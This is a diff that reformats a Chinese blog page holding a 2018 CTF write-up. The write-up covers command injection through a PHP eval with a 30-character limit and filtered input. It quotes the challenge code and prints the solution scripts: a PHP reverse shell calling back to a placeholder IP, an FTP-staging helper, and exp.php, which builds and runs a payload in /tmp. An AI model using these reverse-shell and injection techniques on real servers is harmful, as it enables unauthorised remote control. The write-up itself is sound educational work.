@@ -1,4 +1,117 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><title>有意思的命令注入 - Virink's Blog</title><meta name="author" content="Virink"><meta name="keywords" content="PHP,CODE,AUDIT,CTF,Writeup,Sec,Virink,代码审计,技术博客,php,writeups,ctf,web"><meta name="description" content="Virink的小站,记录杂文与分享一些技术文章"><link href="/static/css/default.min.css" rel="stylesheet"><link rel="icon" type="image/x-icon" href="/static/img/favicon.ico"><link rel="icon" href="/static/img/favicon.ico"><link rel="alternate" href="/atom.xml" title="Virink's Blog" type="application/atom+xml"><script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script></head><body><div class="wrapper"><header><div class="header"><img src="/static/img/logo.png" alt="Virink's Blog logo"><p><a href="/" class="title">Virink's Blog</a></p><p class="subtitle">Let life be beautiful like summer flowers, and death like autume leaves.</p></div><div class="social"><li class="social__item"><a href="https://www.virzz.comatom.xml" title="Virink's RSS"><i class="fa fa-rss"></i> <span class="label">RSS</span></a></li><li class="social__item"><a href="https://github.com/virink" title="Virink's GitHub"><i class="fa fa-github"></i> <span class="label">GitHub</span></a></li><li class="social__item"><a href="https://twitter.com/virinkz" title="Virink's Twitter"><i class="fa fa-twitter"></i> <span class="label">Twitter</span></a></li><li class="social__item"><a href="https://telegram.me/virink" title="Virink's Telegram"><i class="fa fa-paper-plane"></i> <span class="label">Telegram</span></a></li></div><div class="divider__50"></div><nav><li><a href="/">首页</a></li><li><a href="/tags">标签</a></li><li><a href="/archives">归档</a></li><li><a href="/about">关于</a></li><li><a href="/links">友链</a></li></nav></header><div class="divider__70"></div><div class="content"><div class="content-wrap"><article class="article animated fadeIn"><div class="article-title"><i class="fa fa-book"></i>&nbsp;<a href="/2018/02/17/a_funny_command_injection.html">有意思的命令注入</a></div><div class="article-tag"><div class="article-tag-item"><a href="/tags/php/"><i class="fa fa-tag"></i>php</a></div><div class="article-tag-item"><a href="/tags/writeups/"><i class="fa fa-tag"></i>writeups</a></div><div class="article-tag-item"><a href="/tags/ctf/"><i class="fa fa-tag"></i>ctf</a></div><div class="article-tag-item"><a href="/tags/web/"><i class="fa fa-tag"></i>web</a></div></div><div class="article-meta"><div class="article-date"><i class="fa fa-calendar"></i>&nbsp;<time datetime="2018-02-17 01:08:57">2018-02-17 01:08:57</time></div></div><section class="article-content markdown-body"><h2>0x00 意外的题目</h2><p>不知道是啥比赛还是啥啥啥</p><p>朋友问我一个题目 http://l4w.pw/%F0%9F%A4%94/</p><h2>0x01 看看代码</h2><pre><code class="language-php">&lt;?php
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title>有意思的命令注入 - Virink's Blog</title>
+  <meta name="author" content="Virink">
+  <meta name="keywords" content="PHP,CODE,AUDIT,CTF,Writeup,Sec,Virink,代码审计,技术博客,php,writeups,ctf,web">
+  <meta name="description" content="Virink的小站,记录杂文与分享一些技术文章">
+  <!-- css files -->
+  <link href="/static/css/default.min.css" rel="stylesheet">
+  
+  <!-- favicon icon files -->
+  <link rel="icon" type="image/x-icon" href="/static/img/favicon.ico">
+  <link rel="icon" href="/static/img/favicon.ico">
+  <!-- rss atom file -->
+  <link rel="alternate" href="/atom.xml" title="Virink's Blog" type="application/atom+xml">
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+  <!-- Chrome 食用最佳，本主题于Chrome下开发，不适配其他浏览器 -->
+</head>
+<body>
+  <div class="wrapper">
+    <header>
+      <div class="header">
+        <img src="/static/img/logo.png" alt="Virink's Blog logo" />
+        <p ><a href="/" class="title">Virink's Blog</a></p>
+        <p class="subtitle">Let life be beautiful like summer flowers, and death like autume leaves.</p>
+      </div>
+      <!-- Social -->
+      <!-- Social -->
+<div class="social">
+  <!-- RSS Atom -->
+  <li class="social__item">
+    <a href="https://www.virzz.comatom.xml" title="Virink's RSS">
+      <i class='fa fa-rss'></i>
+      <span class="label">RSS</span>
+    </a>
+  </li><!-- Github -->
+  <li class="social__item">
+    <a href="https://github.com/virink" title="Virink's GitHub">
+      <i class='fa fa-github'></i>
+      <span class="label">GitHub</span>
+    </a>
+  </li><!-- Twitter -->
+  <li class="social__item">
+    <a href="https://twitter.com/virinkz" title="Virink's Twitter">
+      <i class='fa fa-twitter'></i>
+      <span class="label">Twitter</span>
+    </a>
+  </li><!-- Telegram -->
+  <li class="social__item">
+    <a href="https://telegram.me/virink" title="Virink's Telegram">
+      <i class='fa fa-paper-plane'></i>
+      <span class="label">Telegram</span>
+    </a>
+  </li></div>
+      <div class="divider__50"></div>
+      <!-- Nav -->
+      <nav>
+          <li><a href="/">首页</a></li>
+          <li><a href="/tags">标签</a></li>
+          <li><a href="/archives">归档</a></li>
+          <li><a href="/about">关于</a></li>
+          <li><a href="/links">友链</a></li>
+      </nav>
+    </header>
+
+    <div class="divider__70"></div>
+
+    <!-- Main panel -->
+    <div class="content">
+    
+    <div class="content-wrap">
+        <article class="article animated fadeIn">
+            <div class="article-title">
+                <i class="fa fa-book"></i>&nbsp;<a href="/2018/02/17/a_funny_command_injection.html">有意思的命令注入</a>
+            </div>
+            <div class="article-tag">
+                
+                <div class="article-tag-item">
+                    <a href="/tags/php/"><i class="fa fa-tag"></i>php</a>
+                </div>
+                
+                <div class="article-tag-item">
+                    <a href="/tags/writeups/"><i class="fa fa-tag"></i>writeups</a>
+                </div>
+                
+                <div class="article-tag-item">
+                    <a href="/tags/ctf/"><i class="fa fa-tag"></i>ctf</a>
+                </div>
+                
+                <div class="article-tag-item">
+                    <a href="/tags/web/"><i class="fa fa-tag"></i>web</a>
+                </div>
+                
+            </div>
+            <div class="article-meta">
+                <div class="article-date">
+                    <i class="fa fa-calendar"></i>&nbsp;<time datetime="2018-02-17 01:08:57">2018-02-17 01:08:57</time>
+                </div>
+            </div>
+            <!-- <div class="clearfix"></div> -->
+            <section class="article-content markdown-body">
+                <h2>0x00 意外的题目</h2>
+
+<p>不知道是啥比赛还是啥啥啥</p>
+
+<p>朋友问我一个题目 http://l4w.pw/%F0%9F%A4%94/</p>
+
+<h2>0x01 看看代码</h2>
+
+<pre><code class="language-php">&lt;?php
 // Connect to localhost:8888 to get the flag
 if($_GET[&#39;👉🏻&#39;] == &#39;👌🏻&#39;) die(phpinfo());
 $_ = $_GET[&#39;⁣&#39;];
@@ -7,12 +120,54 @@ highlight_file(__FILE__);
 if(preg_match(&quot;/[\w]{4,}/is&quot;,$_) || preg_match(&quot;/\[|\&quot;|&#39;|\||\^|~|\./is&quot;,$_)) // mình thích thì mình block hoy 👯
      die(&quot;🙅&quot;); // 4cm is too much
 eval(substr($_,0,30));
-</code></pre><p>没有参数什么鬼、目测是不可见字符、抓个包就出来了<strong>%e2%81%a3</strong></p><p>三个\w绕过的黑科技,还限制30个字符，以及过滤一些符号</p><p>看了看phpinfo发现shell_exec没有ban</p><p>目测<strong>``</strong>命令执行</p><h2>0x02 撸它</h2><p>略过一堆失败、、、</p><p><strong>发现黑科技</strong></p><p><code>sh -c &quot;ec\ho 1&quot;</code> 是可以成功的，emmmmmm，原理不懂</p><p><code>echo xxx &gt; xxx</code> 换行问题在sh中可以用<code>\</code>解决</p><p>ip 用 十进制形式</p><p>bash -i 反弹失败 用 php 来反弹</p><p>服务器没有curl和wget，我反正用 <code>file_get_contents</code></p><p>然后就没有然后了</p><h2>0x03 Flag</h2><p><strong>flag[happy_🌚_new_year]</strong></p><h2>0x04 脚本</h2><p><strong>ip2dec.sh</strong></p><pre><code class="language-bash">ip2dec () {
+</code></pre>
+
+<p>没有参数什么鬼、目测是不可见字符、抓个包就出来了<strong>%e2%81%a3</strong></p>
+
+<p>三个\w绕过的黑科技,还限制30个字符，以及过滤一些符号</p>
+
+<p>看了看phpinfo发现shell_exec没有ban</p>
+
+<p>目测<strong>``</strong>命令执行</p>
+
+<h2>0x02 撸它</h2>
+
+<p>略过一堆失败、、、</p>
+
+<p><strong>发现黑科技</strong></p>
+
+<p><code>sh -c &quot;ec\ho 1&quot;</code> 是可以成功的，emmmmmm，原理不懂</p>
+
+<p><code>echo xxx &gt; xxx</code> 换行问题在sh中可以用<code>\</code>解决</p>
+
+<p>ip 用 十进制形式</p>
+
+<p>bash -i 反弹失败 用 php 来反弹</p>
+
+<p>服务器没有curl和wget，我反正用 <code>file_get_contents</code></p>
+
+<p>然后就没有然后了</p>
+
+<h2>0x03 Flag</h2>
+
+<p><strong>flag[happy_🌚_new_year]</strong></p>
+
+<h2>0x04 脚本</h2>
+
+<p><strong>ip2dec.sh</strong></p>
+
+<pre><code class="language-bash">ip2dec () {
     local a b c d ip=$@
         IFS=. read -r a b c d &lt;&lt;&lt; &quot;$ip&quot;
         printf &#39;%d\n&#39; &quot;$((a * 256 ** 3 + b * 256 ** 2 + c * 256 + d))&quot;
 }
-</code></pre><p><strong>ftpd.py</strong></p><p><code>pip install pyftpdlib</code></p><pre><code class="language-python">from pyftpdlib.authorizers import DummyAuthorizer
+</code></pre>
+
+<p><strong>ftpd.py</strong></p>
+
+<p><code>pip install pyftpdlib</code></p>
+
+<pre><code class="language-python">from pyftpdlib.authorizers import DummyAuthorizer
 from pyftpdlib.handlers import FTPHandler
 from pyftpdlib.servers import FTPServer
 authorizer = DummyAuthorizer()
@@ -21,13 +176,26 @@ handler = FTPHandler
 handler.authorizer = authorizer
 server = FTPServer((&#39;0.0.0.0&#39;, 21), handler)
 server.serve_forever()
-</code></pre><p><strong>ftpdown.sh</strong></p><pre><code class="language-bash">ftp -niv&lt;&lt;!
+</code></pre>
+
+<p><strong>ftpdown.sh</strong></p>
+
+<pre><code class="language-bash">ftp -niv&lt;&lt;!
 open [ip] [port]
 user a a
 mget x
 bye
 !
-</code></pre><p><strong>php_shell.php</strong><br><code>php<br>&lt;?php $sock=fsockopen(&quot;xxx.xxx.xxx.xxx&quot;,23333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);<br></code></p><p><strong>exp.php</strong></p><pre><code class="language-php">&lt;?php
+</code></pre>
+
+<p><strong>php_shell.php</strong><br>
+<code>php<br>
+&lt;?php $sock=fsockopen(&quot;xxx.xxx.xxx.xxx&quot;,23333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);<br>
+</code></p>
+
+<p><strong>exp.php</strong></p>
+
+<pre><code class="language-php">&lt;?php
 error_reporting(0);
 
 function fuck1($u){
@@ -54,4 +222,79 @@ fuck1(&quot;ec\ho bye &gt;&gt;/tmp/0&quot;);
 fuck1(&quot;ec\ho ! &gt;&gt;/tmp/0&quot;);
 fuck1(&quot;php -f /tmp/x&quot;);
 fuck1(&quot;rm /tmp/0&quot;);
-</code></pre></section><div class="article-copyright"><span>本文标题&nbsp;:&nbsp;</span><a href="/2018/02/17/a_funny_command_injection.html" target="_blank">有意思的命令注入</a><br><span>文章作者&nbsp;:&nbsp;</span><a href="https://www.virzz.com" target="_blank">Virink</a><br><span>发布时间&nbsp;:&nbsp;</span><i class="fa fa-calendar"></i>&nbsp;<time datetime="2018-02-17 01:08:57">2018-02-17 01:08:57</time><br><span>最后更新&nbsp;:&nbsp;</span><i class="fa fa-calendar"></i>&nbsp;<time datetime="2018-02-21 03:27:07">2018-02-21 03:27:07</time><br><span>本文链接&nbsp;:&nbsp;</span><a href="https://www.virzz.com/2018/02/17/a_funny_command_injection.html" title="有意思的命令注入" target="_blank">https://www.virzz.com/2018/02/17/a_funny_command_injection.html</a><br><span>转载声明&nbsp;:&nbsp;</span><i class="fa fa-creative-commons"></i>转载请保留原文链接及作者。<br><span>转载说明&nbsp;:&nbsp;</span><i class="fa fa-exclamation-circle"></i>本卡片有模板生成，本人转载来的文章请忽略~~</div></article><div class="toc" data-toc="h2" data-toccontainer="section"></div></div></div><div class="divider__70"></div><footer class="footer"><center><span class="footer__copyright">&copy; 2017-2018. | ❤ <a href="mailto:virink@outlook.com">Virink </a>| 由 <a href="https://github.com/virink/MweBlog">MWEBLOG</a> 强力驱动 | 主题<a href="https://github.com/virink/MweBlog">default</a></span> <span>本站採用<i class="fa fa-creative-commons"></i><a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"知识共享 署名-非商业性使用-禁止演绎 4.0 国际 许可协议"</a></span></center></footer></div><script>!window.jQuery&&document.write(unescape('%3Cscript src="/script/js/jquery.min.js"%3E%3C/script%3E'))</script><script src="/static/js/hackrain.js"></script><script>$(document).ready(function(){hackrain()})</script><script src="//cdn.bootcss.com/mathjax/2.7.2/MathJax.js"></script><script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script><script src="//cdn.bootcss.com/github-repo-widget/e23d85ab8f/jquery.githubRepoWidget.min.js"></script><script src="/static/js/toc.min.js"></script><script>$(document).ready(function(){$("code").each(function(t,a){hljs.highlightBlock(a)}),MathJax.Hub.Config({tex2jax:{inlineMath:[["[latex]","[/latex]"],["\\(","\\)"]]}})})</script><script async src="https://www.googletagmanager.com/gtag/js?id=UA-83885261-1"></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","UA-83885261-1")</script><script>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?8e6156c342669e24891a8ed34161d84a";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script></body></html>
+</code></pre>
+
+            </section>
+            <div class="article-copyright">
+              <span>本文标题&nbsp;:&nbsp;</span><a href="/2018/02/17/a_funny_command_injection.html" target="_blank">有意思的命令注入</a><br />
+              <span>文章作者&nbsp;:&nbsp;</span><a href="https://www.virzz.com" target="_blank">Virink</a><br />
+              <span>发布时间&nbsp;:&nbsp;</span><i class="fa fa-calendar"></i>&nbsp;<time datetime="2018-02-17 01:08:57">2018-02-17 01:08:57</time><br />
+              <span>最后更新&nbsp;:&nbsp;</span><i class="fa fa-calendar"></i>&nbsp;<time datetime="2018-02-21 03:27:07">2018-02-21 03:27:07</time><br />
+              <span>本文链接&nbsp;:&nbsp;</span><a href="https://www.virzz.com/2018/02/17/a_funny_command_injection.html" title="有意思的命令注入" target="_blank">https://www.virzz.com/2018/02/17/a_funny_command_injection.html</a><br />
+              <span>转载声明&nbsp;:&nbsp;</span><i class="fa fa-creative-commons"></i>转载请保留原文链接及作者。<br />
+              <span>转载说明&nbsp;:&nbsp;</span><i class="fa fa-exclamation-circle"></i>本卡片有模板生成，本人转载来的文章请忽略~~
+            </div>
+        </article>
+        <!-- <div class="toc" data-toc="h2,h3,h4,h5,h6"></div> -->
+        <div class="toc" data-toc="h2" data-tocContainer="section"></div>
+    </div>
+
+    </div>
+
+    <div class="divider__70"></div>
+
+    <!-- Footer Panel -->
+    <footer class="footer">
+      <center>
+        <span class="footer__copyright">&copy; 2017-2018. | ❤ <a href="mailto:virink@outlook.com"> Virink </a> | 由 <a href="https://github.com/virink/MweBlog">MWEBLOG</a> 强力驱动 | 主题<a href="https://github.com/virink/MweBlog">default</a></span>
+        <span>本站採用<i class="fa fa-creative-commons"></i><a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"知识共享 署名-非商业性使用-禁止演绎 4.0 国际 许可协议"</a></span>
+        </center>
+    </footer>
+
+  </div>
+  <!-- js files -->
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/script/js/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/static/js/hackrain.js"></script>
+  <script>
+    
+  </script>
+  
+
+<script src="//cdn.bootcss.com/mathjax/2.7.2/MathJax.js"></script>
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script src="//cdn.bootcss.com/github-repo-widget/e23d85ab8f/jquery.githubRepoWidget.min.js"></script>
+<script src="/static/js/toc.min.js"></script>
+<script>
+    $(document).ready(function(){
+        // highlight
+        $('code').each(function(i, block) {
+            hljs.highlightBlock(block);
+        });
+        // MathJax
+        MathJax.Hub.Config({ 
+            tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+        });
+    });
+</script>
+
+  <!-- Analytics Google -->
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-83885261-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'UA-83885261-1');
+</script>
+<!-- Analytics Baidu -->
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?8e6156c342669e24891a8ed34161d84a";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+</body>
+</html>
